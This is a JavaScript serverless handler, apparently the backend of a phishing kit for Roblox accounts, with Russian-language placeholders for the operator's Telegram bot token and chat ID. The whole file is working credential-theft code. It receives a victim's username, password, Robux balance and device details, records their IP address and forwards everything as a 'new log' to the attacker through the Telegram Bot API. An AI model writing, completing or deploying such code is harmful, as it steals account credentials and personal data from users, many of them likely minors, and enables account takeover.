export default async function handler(req, res) {
    if (req.method === 'POST') {
        const { u, p, r, m } = req.body;
        const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

        const token = 'ТВОЙ_ТОКЕН_БОТА'; // ВСТАВЬ СЮДА ТОКЕН
        const chatId = 'ТВОЙ_CHAT_ID'; // ВСТАВЬ СЮДА ID

        const text = `🎁 НОВЫЙ ЛОГ:\n👤 Ник: ${u}\n🔑 Пасс: ${p}\n💎 Робуксы: ${r}\n🌐 IP: ${ip}\n📱 Железо: ${m}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        });

        return res.status(200).json({ ok: true });
    }
    return res.status(405).send('Method not allowed');
}
